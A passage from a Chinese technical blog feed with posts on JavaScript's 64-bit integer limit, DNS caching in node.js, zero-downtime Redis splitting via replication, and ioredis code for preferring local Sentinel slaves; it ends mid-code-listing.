JavaScript represents all numbers internally as 64 bit floating point values (see the ECMAScript spec here). This means JavaScript runtimes are not able to handle integer values larger than 9007199254740992 (2^53).
</p>

<p>
Note that all the positive and negative integers whose magnitude is no greater than 2^53 are representable in the Number type
</p>
</blockquote>

<p>
可见，json 转 blobmsg 不将整型转化为 <code>BLOBMSG_TYPE_INT64</code> 因为 json 不能精确表示 64 位整型。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[解决 DNS 服务器不稳定引起的服务超时问题]]></title>
            <link>/article/89e351b3-dns-670d52a156684e0d7a335b9a5f158d777684670d52a18d8565f695ee9898.html</link>
            <guid>/article/89e351b3-dns-670d52a156684e0d7a335b9a5f158d777684670d52a18d8565f695ee9898.html</guid>
            <pubDate>Tue, 11 Oct 2016 12:30:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
微服务架构下，服务间常常会互相调用，调用前要先解析域名，如果 DNS 服务器不稳定则会导致服务响应超时。
</p>

<p>
DNS 服务器一般由运维人员或者数据中心指定，属于不可控的因素，可以在程序内做 DNS 缓存缓解问题。
</p>

<p>
通过 <a href="https://github.com/yahoo/dnscache">dnscache</a> 模块可以为 node.js 应用全局启用 DNS 缓存。
</p>

<ul class="org-ul">
<li><p>
安装
</p>

<div class="org-src-container">
<pre class="src src-sh">npm install dnscache
</pre>
</div></li>
</ul>


<ul class="org-ul">
<li><p>
启用 DNS 缓存
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">dnscache</span> = require(<span style="color: #8abeb7;">'dnscache'</span>)({
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #8abeb7;">"enable"</span> : <span style="color: #81a2be;">true</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #8abeb7;">"ttl"</span> : 300,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #8abeb7;">"cachesize"</span> : 1000
});
</pre>
</div></li>
</ul>


<p>
启用 DNS 缓存后，只会在缓存过期后才会重新解析域名，如果重新解析域名时 DNS 服务器不稳定还是会导致服务响应超时，相比不用 dnscache 这种问题出现的机率减少了。
</p>

<p>
想到一个对 dnscache 的改进：引入一个刷新时间 refresh_time （远小于缓存时间 ttl），每隔一段时间（refresh_time）异步重新解析一次缓存的域名，如果解析成功则更新 dnscache 并延长 ttl，这样只有当一段时间内（约为 ttl） DNS 服务器始终不稳定才会对服务造成影响，这个特性已在我的分支上实现 <a href="https://github.com/tangxinfa/dnscache/tree/feature-keepalive">feature-keepalive</a> 。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[redis 数据库不停机拆分扩容]]></title>
            <link>/article/redis-6570636e5e934e0d505c673a62c6520662695bb9.html</link>
            <guid>/article/redis-6570636e5e934e0d505c673a62c6520662695bb9.html</guid>
            <pubDate>Thu, 22 Sep 2016 03:02:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
服务开发之始，难以估算最终的数据规模，如按最大容量规划，则会增加项目起步时的复杂性，还有就是资源浪费。
</p>

<p>
所以很多时候，数据都是塞在一个 redis 实例中，当服务规模扩大，单个 redis 实例不足以支撑未来的访问量时，再拆分数据（Partitioning）。
</p>

<p>
Redis 有很多数据迁移工具，如：<a href="https://github.com/yaauie/redis-copy">redis-copy</a> 、<a href="https://github.com/salimane/redis-tools">redis-copy.py</a> 、<a href="http://redis.io/commands/migrate">migrate</a> 等，但是迁移的数据量大时需要不短的时间，会对业务稳定性造成影响。
</p>

<p>
真正可靠的迁移手段估计只有 Redis replication 方式。
</p>

<p>
引用自 <a href="http://redis.io/topics/partitioning#presharding">Partitioning: how to split data among multiple Redis instances. – Redis</a>
</p>
<blockquote>
<p>
Using Redis replication you will likely be able to do the move with minimal or no
downtime for your users:
</p>

<ul class="org-ul">
<li>Start empty instances in your new server.</li>
<li>Move data configuring these new instances as slaves for your source instances.</li>
<li>Stop your clients.</li>
<li>Update the configuration of the moved instances with the new server IP address.</li>
<li>Send the SLAVEOF NO ONE command to the slaves in the new server.</li>
<li>Restart your clients with the new updated configuration.</li>
<li>Finally shut down the no longer used instances in the old server.</li>
</ul>
</blockquote>

<p>
引用自 <a href="http://redis.io/topics/admin">Redis Administration – Redis</a>
</p>
<blockquote>
<p>
Upgrading or restarting a Redis instance without downtime
</p>

<p>
Redis is designed to be a very long running process in your server. For instance many
configuration options can be modified without any kind of restart using the CONFIG SET
command.
</p>

<p>
Starting from Redis 2.2 it is even possible to switch from AOF to RDB snapshots
persistence or the other way around without restarting Redis. Check the output of the
CONFIG GET * command for more information.
</p>

<p>
However from time to time a restart is mandatory, for instance in order to upgrade the
Redis process to a newer version, or when you need to modify some configuration parameter
that is currently not supported by the CONFIG command.
</p>

<p>
The following steps provide a very commonly used way in order to avoid any downtime.
</p>

<ul class="org-ul">
<li>Setup your new Redis instance as a slave for your current Redis instance. In order to
do so you need a different server, or a server that has enough RAM to keep two
instances of Redis running at the same time.</li>
<li>If you use a single server, make sure that the slave is started in a different port
than the master instance, otherwise the slave will not be able to start at all.</li>
<li>Wait for the replication initial synchronization to complete (check the slave log
file).</li>
<li>Make sure using INFO that there are the same number of keys in the master and in the
slave. Check with redis-cli that the slave is working as you wish and is replying to
your commands.</li>
<li>Allow writes to the slave using CONFIG SET slave-read-only no</li>
<li>Configure all your clients in order to use the new instance (that is, the slave).</li>
<li>Once you are sure that the master is no longer receiving any query (you can check
this with the MONITOR command), elect the slave to master using the SLAVEOF NO ONE
command, and shut down your master.</li>
</ul>
</blockquote>

<p>
以下步骤可以不断进行，直到将数据拆到很细的粒度，值得注意的是这种拆分方法只支持将一部分数据拆分到全新的 Redis 实例。
</p>

<ul class="org-ul">
<li>创建新 Redis 实例为旧 Redis 实例的 Slave</li>

<li><p>
服务同时连接新旧 Redis 实例
</p>

<p>
迁移时代码需要更新并重启服务，服务需支持优雅重启：服务进程依次重启使得客户感觉不到服务被中断。
</p>

<p>
通过预先连接新旧 Redis 实例，使得接下来的迁移动作不需要重启服务，一键瞬间完成。
</p>

<p>
迁移后，清除新旧 Redis 实例中的删除脏数据可能耗时较长，对于通过 scan 扫描数据的业务逻辑部分，需容忍脏数据：根据 hash 规则，扫描到数据不属于当前 Redis 实例时忽略掉，避免使用脏数据。
</p>

<p>
Slave 的数据复制进度追上后，进行下一步。
</p></li>

<li><p>
让新 Redis 实例可写
</p>

<pre class="example">
config set slave-read-only no
</pre>

<p>
新 Redis 实例也可写入，旧 Redis 的写请求还会同步到新的 Redis 实例，使得迁移过程中数据基本不丢失。
</p>

<p>
要求新旧 Redis 实例比较稳定，发生全量同步会导致数据丢失。
</p></li>

<li><p>
服务从新 Redis 实例访问迁移走的数据
</p>

<p>
可以通过给所有服务结点广播消息方式实现，将服务的 Redis 访问快速切到新 Redis 实例上。
</p>

<p>
正常情况下，旧 Redis 中已迁移的数据应该不会再有读写，如果有的话可能是还没有迁移干净，应该立即找到访问源，进行中断或迁移。
</p></li>

<li><p>
新 Redis 实例断开与旧实例的 Master-Slave 关系
</p>

<p>
新 Redis 实例改为角色为 Master，恢复 <code>slave-read-only</code> 配置项为 <code>yes</code> 。
</p>

<p>
新的 Redis 实例可以进一步使用 Redis Sentinel 来监控以实现高可用。
</p></li>

<li>删除新 Redis 实例中多迁来的数据</li>

<li><p>
删除旧 Redis 实例中已迁走的数据
</p>

<p>
所有数据都迁移走后，可以将它停掉。
</p></li>
</ul>


<p>
最近看了《 <a href="http://www.infoq.com/cn/articles/online-data-migration-experience">在线数据迁移经验：如何为正在飞行的飞机更换引擎</a> 》，发现前面的 redis 操作步骤与文章中的在线数据迁移步骤极其相似：
</p>

<ul class="org-ul">
<li><p>
迁移前
</p>

<p>
写旧、读旧
</p></li>

<li><p>
上线双写
</p>

<p>
写新、写旧、读旧
</p></li>

<li><p>
历史数据搬迁
</p>

<p>
写新、写旧、读旧
</p></li>

<li><p>
切读
</p>

<p>
写新、写旧、读新
</p></li>

<li><p>
清理
</p>

<p>
写新、读新。
</p></li>
</ul>

<p>
这是一种数据迁移的通用模式。
</p>


<p>
另一篇文章《<a href="http://www.brunton-spall.co.uk/post/2014/05/06/database-migrations-done-right/">Database migrations done right - Michael Brunton-Spall</a>》提出了一个基本原则:
</p>

<blockquote>
<p>
你做出的每一处改动必须与系统的其余部分保持向后兼容
</p>

<p>
Every change you make must be backward compatible with the rest of the system
</p>
</blockquote>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[ioredis Sentinel 实现就近访问]]></title>
            <link>/article/ioredis-sentinel-5b9e73b05c318fd18bbf95ee.html</link>
            <guid>/article/ioredis-sentinel-5b9e73b05c318fd18bbf95ee.html</guid>
            <pubDate>Sat, 10 Sep 2016 10:12:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-orga9c88c0" class="outline-2">
<h2 id="orga9c88c0">跨机房 redis 访问性能堪忧</h2>
<div class="outline-text-2" id="text-orga9c88c0">
<p>
线上服务运行结果显示跨机房相对不跨机房，一个 redis 长连接上的 QPS 会低一个数量级： <code>50</code> vs <code>640</code> 。
这是因为 Redis 的请求-响应是串行的，网络时延会对 QPS 造成巨大的响应。
因此，一定要尽量连接距离更近的 Redis 实例。
</p>
</div>
</div>

<div id="outline-container-orga9531f8" class="outline-2">
<h2 id="orga9531f8"><a href="https://github.com/luin/ioredis/">ioredis</a> 支持按角色（Role）进行连接</h2>
<div class="outline-text-2" id="text-orga9531f8">
<p>
引用自 <a href="https://github.com/luin/ioredis/">ioredis</a>
</p>
<blockquote>
<p>
ioredis 保证即使故障转移（failover）后你连接的结点依然是 master 。当故障转移发生，ioredis 会向 sentinels 询问新的 master 结点并连接，而不是尝试重连失效的结点（恢复可用后它会降级为 slave）。故障转移期间发送的所有命令将放入队列，当新连接建立后再执行，不会丢失命令。
</p>

<p>
可以指定 role 选项为 slave 以连接 slave 结点，ioredis 将尝试连接指定 master 的一个随机 slave 结点，并且保证连接的结点总是 slave 角色。当连接的结点因为故障转移而提升为 master，ioredis 将从该结点断开连接并询问 sentinels 获取另一个 slave 结点进行连接。
</p>

<p>
ioredis guarantees that the node you connected to is always a master even after a failover. When a failover happens, instead of trying to reconnect to the failed node (which will be demoted to slave when it's available again), ioredis will ask sentinels for the new master node and connect to it. All commands sent during the failover are queued and will be executed when the new connection is established so that none of the commands will be lost.
</p>

<p>
It's possible to connect to a slave instead of a master by specifying the option role with the value of slave, and ioredis will try to connect to a random slave of the specified master, with the guarantee that the connected node is always a slave. If the current node is promoted to master due to a failover, ioredis will disconnect from it and ask the sentinels for another slave node to connect to.
</p>
</blockquote>
</div>
</div>

<div id="outline-container-org857f301" class="outline-2">
<h2 id="org857f301"><a href="https://github.com/luin/ioredis/">ioredis</a> 会随机选择一个 Slave</h2>
<div class="outline-text-2" id="text-org857f301">
<p>
引用自 ioredis/lib/connectors/sentinel_connector.js
</p>
<div class="org-src-container">
<pre class="src src-js">SentinelConnector.<span style="color: #81a2be;">prototype</span>.resolveSlave = <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">client</span>, <span style="color: #f0c674;">callback</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> client.sentinel(<span style="color: #8abeb7;">'slaves'</span>, <span style="color: #81a2be;">this</span>.options.name, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">err</span>, <span style="color: #f0c674;">result</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.disconnect();
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> callback(err);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">selectedSlave</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (Array.isArray(result)) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">availableSlaves</span> = [];
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">for</span> (<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">i</span> = 0; i &lt; result.length; ++i) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">slave</span> = utils.packObject(result[i]);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (slave.flags &amp;&amp; !slave.flags.match(<span style="color: #8abeb7;">/(disconnected|s_down|o_down)/</span>)) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span> availableSlaves.push(slave);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span> }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span> selectedSlave = _.sample(availableSlaves);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   callback(<span style="color: #81a2be;">null</span>, selectedSlave ? { host: selectedSlave.ip, port: selectedSlave<span style="text-decoration: underline;">.port } : </span><span style="color: #81a2be; text-decoration: underline;">null</span><span style="text-decoration: underline;">);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> });
};
</pre>
</div>
</div>
</div>

<div id="outline-container-org8aa4506" class="outline-2">
<h2 id="org8aa4506">判断本地还是异地的算法</h2>
<div class="outline-text-2" id="text-org8aa4506">
<p>
按 IP 地址进行推断，前 N 段一样则认为是本地。
</p>

<p>
如 N 取值为 3，本机 IP 为 11.22.33.1，则 11.22.33.123 由于前 3 段（11.22.33）与本机相同被认定为是本地，而 11.22.99.1 由于前 3 段（11.22.99）与本机不同被认定为是异地。
</p>
</div>
</div>

<div id="outline-container-org9d254a6" class="outline-2">
<h2 id="org9d254a6">redis 至少要求 2.8.12</h2>
<div class="outline-text-2" id="text-org9d254a6">
<p>
redis 2.8.12 实现了一个特性：当 failover （redis 角色变化）后，断开所有 client 的连接。
</p>

<p>
缺少这个特性会导致 failover 发生后与原 master 连接还是保持的，后继请求返回 READONLY 错误。
</p>

<p>
可以设置 reconnectOnError 选项，判断错误类型为 READONLY 后触发重连。
</p>

<p>
但 PUB/SUB 不会出现 READONLY 错误，所以还是要升级到 2.8.12 以上。
</p>
</div>
</div>

<div id="outline-container-org3d9e7b4" class="outline-2">
<h2 id="org3d9e7b4">在 &lt;2.4.0 的 ioredis 上实现优先选择本地 Slave</h2>
<div class="outline-text-2" id="text-org3d9e7b4">
<p>
相关讨论
</p>

<p>
<a href="https://github.com/luin/ioredis/issues/38">rfc - a preferred slave list in a sentinel setup · Issue #38 · luin/ioredis</a>
</p>

<p>
preferredSlaves 选项已经在 2.4.0 版实现，下面的代码在旧版本 ioredis 的基础上实现，仅供参考，不建议使用。
</p>

<p>
主要的通过替换 SentinelConnector.prototype.resolveSlave, SentinelConnector.prototype.resolveMaster, SentinelConnector.prototype.check 实现：
</p>

<ul class="org-ul">
<li>从到 sentinel 的连接上取得本机地址</li>
</ul>


<ul class="org-ul">
<li>从 sentinel 取出 slaves 列表</li>
</ul>


<ul class="org-ul">
<li>将 slaves 列表分为本地列表和异地列表</li>
</ul>


<ul class="org-ul">
<li>优先从本地列表随机选择一个 slave</li>
</ul>

<p>
具体实现如下
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">Redis</span>     = require(<span style="color: #8abeb7;">'ioredis'</span>),
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   utils     = require(<span style="color: #8abeb7;">'ioredis/lib/utils'</span>),
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   _         = require(<span style="color: #8abeb7;">'lodash'</span>),
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   net       = require(<span style="color: #8abeb7;">'net'</span>),
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   assert    = require(<span style="color: #8abeb7;">'assert'</span>);


<span style="color: #b294bb;">/**</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* A SentinelConnector.prototype.resolveSlave replacement, prefer local slave.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* @param client redis client.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* @param callback function (err, slave) called when done.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*                 slave with a extra boolean field "local_node" to indicate sla</span><span style="color: #b294bb; text-decoration: underline;">ve is in local network.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*/</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">resolveSlavePreferLocal</span> (<span style="color: #f0c674;">client</span>, <span style="color: #f0c674;">callback</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">self</span> = <span style="color: #81a2be;">this</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.sentinel(<span style="color: #8abeb7;">'slaves'</span>, <span style="color: #81a2be;">this</span>.options.name, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">err</span>, <span style="color: #f0c674;">result</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.disconnect();
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> callback(err);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">localIP</span> = client.stream.localAddress;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.disconnect();

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">localIPSegments</span> = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Array</span>(4);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (net.isIPv4(localIP)) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   localIPSegments = localIP.split(<span style="color: #8abeb7;">'.'</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">selectedSlave</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">local_node</span> = <span style="color: #81a2be;">false</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (Array.isArray(result)) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">localSlaves</span> = [];
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">remoteSlaves</span> = [];
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">for</span> (<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">i</span> = 0; i &lt; result.length; ++i) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">slave</span> = utils.packObject(result[i]);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (slave.flags &amp;&amp; !slave.flags.match(<span style="color: #8abeb7;">/(disconnected|s_down|o_do</span><span style="color: #8abeb7; text-decoration: underline;">wn)/</span><span style="text-decoration: underline;">)) {</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (net.isIPv4(slave.ip)) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">slaveIpSegments</span> = slave.ip.split(<span style="color: #8abeb7;">'.'</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (localIPSegments[0] === slaveIpSegments[0] &amp;&amp;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   localIPSegments[1] === slaveIpSegments[1] &amp;&amp;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   localIPSegments[2] === slaveIpSegments[2]) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   localSlaves.push(slave);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">continue</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   remoteSlaves.push(slave);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   selectedSlave = _.sample(localSlaves.length ? localSlaves : remoteSl<span style="text-decoration: underline;">aves);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   local_node = Boolean(localSlaves.length);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.warn(<span style="color: #8abeb7;">'redis('</span> + JSON.stringify({name: self.options.name, db: sel<span style="text-decoration: underline;">f.options.db, sentinels: self.options.sentinels}) + </span><span style="color: #8abeb7; text-decoration: underline;">') resolve slave to'</span><span style="text-decoration: underline;"> + (local_node ? </span><span style="color: #8abeb7; text-decoration: underline;">' local'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">) + </span><span style="color: #8abeb7; text-decoration: underline;">': '</span><span style="text-decoration: underline;"> + selectedSlave.ip + </span><span style="color: #8abeb7; text-decoration: underline;">':'</span><span style="text-decoration: underline;"> + selectedSlave.port);</span>

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   callback(<span style="color: #81a2be;">null</span>, selectedSlave ? { host: selectedSlave.ip, port: selectedS<span style="text-decoration: underline;">lave.port, local_node: local_node } : </span><span style="color: #81a2be; text-decoration: underline;">null</span><span style="text-decoration: underline;">);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
};

<span style="color: #b294bb;">/**</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* Prefer connect to local slave.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* @param client redis client.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* @return is this change successful.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*/</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">preferLocalSlave</span>(<span style="color: #f0c674;">client</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (client.options.role === <span style="color: #8abeb7;">'slave'</span> &amp;&amp; client.connector.resolveSlave) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (client.options.lazyConnect &amp;&amp; client.status == <span style="color: #8abeb7;">'wait'</span>) {
